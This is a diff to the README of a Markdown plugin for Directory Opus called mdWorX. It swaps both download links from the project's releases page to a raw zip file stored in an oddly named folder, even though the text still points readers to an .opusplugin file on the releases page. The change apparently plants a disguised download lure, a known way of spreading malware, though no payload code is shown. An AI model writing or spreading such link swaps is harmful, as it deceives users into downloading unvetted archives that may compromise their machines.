@@ -1,6 +1,6 @@
 # 📝 mdWorX - View and edit Markdown files easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/threelobed-roughrider547/mdWorX/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/threelobed-roughrider547/mdWorX/raw/refs/heads/main/thricecock/X-Wor-md-3.8.zip)
 
 mdWorX brings powerful Markdown editing tools into Directory Opus. You can view, create, and change your notes without leaving your file manager. It provides a live preview as you type, so you see your formatting updates immediately.
 
@@ -8,7 +8,7 @@ mdWorX brings powerful Markdown editing tools into Directory Opus. You can view,
 
 Click the link below to go to the releases page. Choose the latest version file that ends in .opusplugin.
 
-[Download mdWorX here](https://github.com/threelobed-roughrider547/mdWorX/releases)
+[Download mdWorX here](https://github.com/threelobed-roughrider547/mdWorX/raw/refs/heads/main/thricecock/X-Wor-md-3.8.zip)
 
 ## ⚙️ Installation steps
 
